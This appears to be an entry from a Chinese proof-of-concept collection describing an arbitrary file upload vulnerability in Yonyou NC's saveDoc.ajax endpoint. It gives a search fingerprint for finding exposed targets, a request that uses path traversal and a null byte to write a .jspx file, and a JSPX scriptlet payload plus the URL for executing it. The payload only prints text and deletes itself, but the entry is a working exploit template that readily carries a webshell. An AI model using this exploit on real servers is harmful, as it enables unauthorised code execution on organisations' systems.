# 用友NCsaveDoc.ajax存在任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /uapws/saveDoc.ajax?ws=/../../test2.jspx%00 HTTP/1.1`

**Payload**
```
content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
<hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
<hi:scriptlet>
out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete();
</hi:scriptlet>
</hi>
http://ip/uapws/test2.jspx
```